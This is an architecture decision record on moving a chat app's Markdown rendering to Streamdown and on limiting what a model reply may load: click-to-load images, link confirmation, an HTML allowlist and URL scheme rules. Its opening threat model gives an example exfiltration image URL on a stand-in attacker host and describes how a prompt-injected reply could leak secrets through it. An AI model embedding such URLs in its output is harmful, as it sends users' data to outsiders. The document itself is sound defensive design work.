# ADR 0039: Chat Markdown through Streamdown, and what a reply may load

Accepted 2026-10-10 with the owner (the client-performance plan). Builds on ADR 0023 (chat blocks and one kit).

Replies were set with react-markdown: the whole reply was parsed again with every streamed batch (about every 100 ms),
raw HTML showed as written, links were plain anchors, and an image in a reply loaded as soon as the reply named it.
A reply is untrusted text: the model may be repeating a tool result, a web page or a message someone else wrote. An
image URL such as `https://attacker.example/?d=<secret>` is fetched by the browser without anyone clicking, so a
prompt-injected reply could carry data out; a link can name one place and lead to another.

## Decision

**Streamdown parses replies and tool output.** It splits a reply into blocks and renders each on its own, so a
streamed batch renders only the block being written. Chat stays in streaming mode once a reply settles, so its blocks
are not remounted (a table scrolled sideways keeps its place). Every Streamdown renderer is replaced by its plain
element (`PLAIN` in `components/parts/markdown.tsx`), so shadcn/typeset sets the text as before. A ```mermaid,
```chart or ```map fence draws only once whole; Streamdown says which block's fence is still open
(`useIsCodeFenceIncomplete`).

**Code blocks are Goblin's own** (`components/parts/code-block.tsx`): typeset's `<pre>`, a copy button, and Shiki's
colours for the theme once the first code block loads `@streamdown/code` in the browser (`code-highlight.ts`; never on
the server, so Shiki stays out of the Worker and the chat route's first load). Streamdown's own code block is not
used: its Tailwind classes that Goblin's sources also use (`flex`, `p-4`, `border`) are generated and would restyle it
from the utilities layer, and it skips painting off-screen blocks at a guessed height, which the transcript's
measured anchoring cannot have.

**Tables copy and export** (`reply-table.tsx`): a corner menu copies a reply's table as Markdown, CSV or TSV or
downloads it as CSV, with Streamdown's table helpers reading what is on screen; Streamdown's own table and its
controls are not used, for the same reasons as its code block. Tool tables stay plain.

**Images load when the owner asks.** An image in a reply is a button naming it and its host; a click fetches it once,
without a referrer. Anything but an http(s) source stays a name.

**Links show where they go.** A link stays a real `<a href>`, but in the shell a click or middle click opens one
shared dialog with the whole address and its host first (`LinkConfirmProvider`); Open opens it in a new tab with no
referrer or opener. Footnote links stay in the reply.

**A reply may use a little HTML** (`lib/reply-html.ts`): `rehype-raw`, then `rehype-sanitize` with an allowlist of
Markdown's own elements plus `details`/`summary`, `kbd`, `sub`, `mark` and `ins` (`br`, `sup` and `del` are already
Markdown's). Only the attributes Markdown needs survive (footnote ids keep remark-rehype's `user-content-` prefix, so
a reply's own `id` cannot clobber a page global); no styles, classes, handlers, frames, forms, scripts or media.

**Addresses are web or mail** (`replyUrl`): a link keeps an absolute http(s) or `mailto:` address, or a `#` place in
the reply; an image an absolute http(s) one. Everything else becomes text: `javascript:` and `data:` run or carry
content, and a relative address would act on this app's own origin. Streamdown's own default URL transform passes
everything and leaves safety to `rehype-harden`, whose prefixes are an origin allowlist and whose wildcard keeps
relative links, so it is not used.

**Tool output stays untrusted text** (`ToolMarkdown`): static mode, no rehype plugins (raw HTML shows as written),
`webOnly` links that show their host, images named and never fetched, fences left as code.

## Consequences

- `rehype-raw` brings parse5 into the chat bundle; Streamdown imports it whatever the plugins, so using it costs no
  more than not using it.
- A closing fence line with text after it does not close a fence, but Streamdown calls the block whole a batch early;
  the figure then has that line in its source, cannot draw, and shows its code until the fence closes.
- `test/markdown-render.test.ts` holds the fence cases react-markdown was checked against and the HTML and address
  rules; `test/ui-markdown.ts` checks images, links and settling in Chromium.
